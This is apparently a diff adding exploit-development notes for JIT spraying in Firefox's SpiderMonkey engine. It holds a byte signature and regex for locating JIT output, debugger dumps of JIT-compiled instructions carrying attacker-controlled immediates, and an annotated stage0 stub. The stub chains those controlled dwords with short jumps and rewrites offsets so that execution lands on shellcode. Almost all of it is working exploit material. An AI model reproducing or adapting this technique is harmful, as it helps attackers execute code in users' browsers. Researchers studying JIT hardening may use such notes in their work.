@@ -1,0 +1,166 @@
+
+jit marker:
+
+14760052   89E1                    MOV ECX,ESP
+14760054   895C24 1C               MOV DWORD PTR SS:[ESP+1C],EBX
+14760058   C74424 18 70A1ED14      MOV DWORD PTR SS:[ESP+18],14EDA170
+14760060   E8 0BDC5F51             CALL mozjs.65D5DC70
+
+14760052   89E1                    MOV ECX,ESP
+14760054   895C24 1C               MOV DWORD PTR SS:[ESP+1C],EBX
+14760058   C74424 18  xxxxxxxx     MOV DWORD PTR SS:[ESP+18], xxxxxxxx
+14760060   E8  xxxxxxxx            CALL mozjs.65D5DC70 ;rva = FDC70
+0B950065   89C7                    MOV EDI,EAX
+
+89e1895c241cc7442418[0-9a-f]{8}e8[0-9a-f]{8}89c7
+
+CPU Dump
+Address   Hex dump                   Command                                  Comments
+1BC1009B    C747 04 0100FFFF         MOV DWORD PTR DS:[EDI+4],FFFF0001
+1BC100A2    C707 66554433            MOV DWORD PTR DS:[EDI],33445566
+1BC100A8    89C7                     MOV EDI,EAX
+1BC100AA    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC100AD    C747 0C 0100FFFF         MOV DWORD PTR DS:[EDI+0C],FFFF0001
+1BC100B4    C747 08 66554433         MOV DWORD PTR DS:[EDI+8],33445566
+1BC100BB    89C7                     MOV EDI,EAX
+1BC100BD    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC100C0    C747 14 0100FFFF         MOV DWORD PTR DS:[EDI+14],FFFF0001
+1BC100C7    C747 10 66554433         MOV DWORD PTR DS:[EDI+10],33445566
+1BC100CE    89C7                     MOV EDI,EAX
+1BC100D0    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC100D3    C747 1C 0100FFFF         MOV DWORD PTR DS:[EDI+1C],FFFF0001
+1BC100DA    C747 18 66554433         MOV DWORD PTR DS:[EDI+18],33445566
+1BC100E1    89C7                     MOV EDI,EAX
+1BC100E3    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC100E6    C747 24 0100FFFF         MOV DWORD PTR DS:[EDI+24],FFFF0001
+1BC100ED    C747 20 66554433         MOV DWORD PTR DS:[EDI+20],33445566
+1BC100F4    89C7                     MOV EDI,EAX
+1BC100F6    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC100F9    C747 2C 0100FFFF         MOV DWORD PTR DS:[EDI+2C],FFFF0001
+1BC10100    C747 28 66554433         MOV DWORD PTR DS:[EDI+28],33445566
+1BC10107    89C7                     MOV EDI,EAX
+1BC10109    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC1010C    C747 34 0100FFFF         MOV DWORD PTR DS:[EDI+34],FFFF0001
+1BC10113    C747 30 66554433         MOV DWORD PTR DS:[EDI+30],33445566
+1BC1011A    89C7                     MOV EDI,EAX
+1BC1011C    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC1011F    C747 3C 0100FFFF         MOV DWORD PTR DS:[EDI+3C],FFFF0001
+1BC10126    C747 38 66554433         MOV DWORD PTR DS:[EDI+38],33445566
+1BC1012D    89C7                     MOV EDI,EAX
+1BC1012F    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC10132    C747 44 0100FFFF         MOV DWORD PTR DS:[EDI+44],FFFF0001
+1BC10139    C747 40 66554433         MOV DWORD PTR DS:[EDI+40],33445566
+
+
+
+CPU Dump
+Address   Hex dump                   Command                                  
+1BC101C5    89C7                     MOV EDI,EAX
+1BC101C7    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC101CA    C787 84000000 0100FFFF   MOV DWORD PTR DS:[EDI+84],FFFF0001
+1BC101D4    C787 80000000 66554433   MOV DWORD PTR DS:[EDI+80],33445566
+1BC101DE    89C7                     MOV EDI,EAX
+1BC101E0    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC101E3    C787 8C000000 0100FFFF   MOV DWORD PTR DS:[EDI+8C],FFFF0001
+1BC101ED    C787 88000000 66554433   MOV DWORD PTR DS:[EDI+88],33445566
+1BC101F7    89C7                     MOV EDI,EAX
+1BC101F9    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC101FC    C787 94000000 0100FFFF   MOV DWORD PTR DS:[EDI+94],FFFF0001
+1BC10206    C787 90000000 66554433   MOV DWORD PTR DS:[EDI+90],33445566
+1BC10210    89C7                     MOV EDI,EAX
+1BC10212    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC10215    C787 9C000000 0100FFFF   MOV DWORD PTR DS:[EDI+9C],FFFF0001
+1BC1021F    C787 98000000 66554433   MOV DWORD PTR DS:[EDI+98],33445566
+1BC10229    89C7                     MOV EDI,EAX
+1BC1022B    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC1022E    C787 A4000000 0100FFFF   MOV DWORD PTR DS:[EDI+0A4],FFFF0001
+1BC10238    C787 A0000000 66554433   MOV DWORD PTR DS:[EDI+0A0],33445566
+1BC10242    89C7                     MOV EDI,EAX
+1BC10244    8B7F 24                  MOV EDI,DWORD PTR DS:[EDI+24]
+1BC10247    C787 AC000000 0100FFFF   MOV DWORD PTR DS:[EDI+0AC],FFFF0001
+1BC10251    C787 A8000000 66554433   MOV DWORD PTR DS:[EDI+0A8],33445566
+
+
+; e8 00 00 00 is a part of one of mov [edi+offset], XXX instructions
+
+    e8 00 00 00 00  call $+5    ; last 00 is a controlled byte
+    5d              pop ebp
+    eb 15           jmp next_dword
+
+; eb 15 jumps from end of one controlled dword to beginning of the next one
+    
+
+    31 d2           xor edx, edx
+    -- jmp
+
+    b2 19           mov dl, 19h
+    -- jmp
+    
+    31 db           xor ebx, ebx
+    -- jmp
+    
+    b3 04           mov bl, 4
+    -- jmp
+    
+    31 c9           xor ecx, ecx
+    -- jmp
+
+    89 ef           mov edi, ebp
+    -- jmp
+
+    29 df           sub edi, ebx
+    -- jmp
+
+    4f              dec edi
+    90              nop
+    -- jmp
+    
+    31 c0           xor eax, eax
+    -- jmp
+
+    b0 15           mov al, 16h     ;stage0 "size" in chunks
+    -- jmp
+
+    f2 e7           mul edx
+    -- jmp
+
+    01 c7           add edi, eax
+    -- jmp
+
+    b2 19           mov dl, 19h     ;mul cleared edx
+    -- jmp
+
+; patch offsets in mov [edi+offset], XXX instructions
+
+@@:
+    89 0f           mov [edi], ecx
+    -- jmp
+    
+    01 d7           add edi, edx
+    -- jmp
+    
+    00 d9           add cl, bl
+    75 b3           jnz @b
+
+; adjust edi, so that when copying is done,
+; execution is passed directly to the shellcode (without using jumps)
+    
+    01 df           add edi, ebx
+    -- jmp
+
+    01 df           add edi, ebx ; edi = edi+8
+    -- jmp
+    
+    89 e8           mov eax, ebp
+    -- jmp
+
+    89 78 24        mov dword ptr [eax+24], edi
+    90              nop
+
+
+89c7                         mov edi,eax
+8b7f 24                      mov edi,dword ptr ds:[edi+24]
+c787 84000000 0100ffff       mov dword ptr ds:[edi+84],ffff0001
+c787 80000000 66554433       mov dword ptr ds:[edi+80],33445566
+
+
